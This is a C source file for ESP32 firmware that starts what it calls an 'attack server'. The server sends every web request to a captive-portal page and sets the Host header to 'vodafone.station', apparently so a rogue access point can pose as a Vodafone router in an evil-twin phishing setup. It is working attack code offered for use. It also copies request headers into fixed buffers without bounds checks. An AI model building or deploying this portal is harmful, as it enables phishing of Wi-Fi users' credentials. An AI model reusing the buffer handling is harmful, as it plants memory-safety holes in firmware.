#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "spi_flash_mmap.h"

#include "esp_wifi.h"
#include "esp_event.h"
#include "freertos/event_groups.h"
#include "esp_log.h"
#include "nvs_flash.h"

#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/api.h>
#include <lwip/netdb.h>

#include "esp_http_server.h"

#include "web_page.h"
#include "server.h"


static const char *TAG = "HTTPD";	//TAG for debug
static const char *host = "vodafone.station";
static const char *captive_portal_url = "http://192.168.4.1/captive_portal";
static httpd_handle_t server = NULL;


static void captive_portal_redirect(httpd_req_t *req)
{
	/* Check if we is know page request */
	if( strcmp(req->uri, "/captive_portal") == 0 )
	{
		httpd_resp_set_type(req, "text/html");
		httpd_resp_send(req, HTML_PAGE, HTTPD_RESP_USE_STRLEN);
		return;
	}
	/* Activate captive portal */
	else
	{
		httpd_resp_set_status(req, "302 Found");
		httpd_resp_set_hdr(req, "Host", host);
		httpd_resp_set_hdr(req, "Location", captive_portal_url);
		httpd_resp_send(req, NULL, 0);
		return;
	}
}


static esp_err_t redirect_handler(httpd_req_t *req) 
{
	/* Request information */
	char Host[64] = { 0 };
	char UserAgent[128] = { 0 };
	char ContentType[64] = { 0 };
	char ContentLen[8] = { 0 };
	char Referer[64] = { 0 };

	/* Read request header */
	int len = httpd_req_get_hdr_value_len(req, "Host");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Host", Host, len+1);
    }
	len = httpd_req_get_hdr_value_len(req, "User-Agent");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "User-Agent", UserAgent, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Content-Type");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Content-Type", ContentType, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Content-Length");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Content-Length", ContentLen, len);
    }
	len = httpd_req_get_hdr_value_len(req, "Referer");
	if (len > 0) {
        httpd_req_get_hdr_value_str(req, "Referer", Referer, len);
    }

	captive_portal_redirect(req);

    return ESP_OK;
}


void http_attack_server_start(void)
{
	if( server != NULL )
	{
		ESP_LOGE(TAG, "Attack server already started.");
		return;
	}

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
	config.ctrl_port = 81;
	config.server_port = 80;
	config.uri_match_fn = httpd_uri_match_wildcard;
	config.max_open_sockets = 10;
	config.lru_purge_enable = true;

    if (httpd_start(&server, &config) == ESP_OK) 
	{
        httpd_uri_t redirect_uri = {
            .uri = "/*",
            .method = HTTP_GET,
            .handler = redirect_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(server, &redirect_uri);
    }
	else
	{
		ESP_LOGE(TAG, "Failed to start captive portal server.");
	}
}


void http_attack_server_stop(void)
{
	if( server != NULL )
    {
        if( httpd_stop(server) != ESP_OK )
        {
            ESP_LOGD(TAG, "Failed to stop attack server.");
            return;
        }
    }
}